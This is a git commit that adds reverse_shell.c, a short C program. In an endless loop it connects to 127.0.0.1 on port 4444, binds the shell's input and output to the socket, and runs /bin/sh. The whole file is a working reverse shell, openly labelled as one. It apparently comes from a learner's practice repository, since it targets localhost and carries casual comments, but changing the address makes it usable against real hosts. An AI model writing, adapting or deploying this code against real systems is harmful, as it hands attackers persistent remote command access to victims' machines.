7280aac93761c4c0b3c0734841059d5f4aaedb00
TheGreen <146537118+TheGreen444@users.noreply.github.com>
2025-10-23 11:10:09 +0545

    Add reverse shell implementation in reverse_shell.c

---
+++ reverse_shell.c
@@ -0,0 +1,42 @@
+#include <sys/socket.h>
+#include <string.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+struct sockaddr_mine{
+unsigned short fam;
+unsigned short port;
+unsigned int ip;
+char padding[8];
+};
+
+int main(void){
+
+while(1){
+int sockhndl = socket(2, 1, 0); // 2 is AF_INET and 1 is SOCK_STREAM (TCP) and 0 is default of tcp somethin like that...
+
+struct sockaddr_mine data;
+memset(&data, 0, sizeof(data));
+data.fam = AF_INET;
+data.port = htons(4444);
+data.ip = inet_addr("127.0.0.1");
+
+if(connect(sockhndl, (struct sockaddr*)&data, sizeof(data)) == 0){
+if(fork() == 0){
+dup2(sockhndl, 0); // stdin to socket
+dup2(sockhndl, 1); //stdout  "   "
+dup2(sockhndl, 2); // stderror "  "
+
+char *argv[] = {"/bin/sh", NULL};
+execve("/bin/sh", argv, NULL);
+}
+close(sockhndl);
+wait(NULL); // wait 4 child to exit
+}
+
+sleep(3);
+}
+
+return 0;
+}
